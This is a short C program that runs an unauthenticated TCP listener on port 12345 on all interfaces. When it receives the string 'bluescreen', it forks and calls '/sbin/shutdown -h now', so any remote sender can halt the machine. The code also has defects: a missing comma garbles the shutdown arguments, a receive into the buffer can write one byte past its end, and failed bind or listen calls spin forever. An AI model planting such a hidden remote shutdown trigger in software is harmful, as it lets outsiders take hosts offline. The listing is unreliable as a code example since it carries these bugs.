#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define TRUE 1
#define FALSE 0
#define PORT 12345
#define BUFF_SIZE 1024

char buff[BUFF_SIZE];

static void bluescreen()
{
    pid_t pid;

    pid = fork();
    if(pid < 0) {
        perror("fork");
    } else if(pid == 0) {
        execl("/sbin/shutdown", "sbin/shutdown" "-h", "now", NULL);
    } else {
        exit(0);
    }
    
}

static void setup()
{
    int sockfd, nsockfd, addrlen, datalen;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    addrlen = sizeof(struct sockaddr_in);

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    while (bind(sockfd, (struct sockaddr *)&server_addr, addrlen) == -1);

    while(listen(sockfd, 10) == -1);

    while (TRUE)
    {
        printf("waiting for request...\n");
        nsockfd = accept(sockfd, (struct sockaddr *)&client_addr, &addrlen);

        while((datalen = recv(nsockfd, buff, BUFF_SIZE, 0)) > 0) {
	    buff[datalen] = 0;
            if(strcmp(buff, "bluescreen") == 0) {
                bluescreen();
            } else {
                printf("%s\n", buff);
            }
        }
    
        close(nsockfd);
    }
    
    close(sockfd);
}

int main(int argc, char *argv[])
{
    setup();
    
    return 0;
}
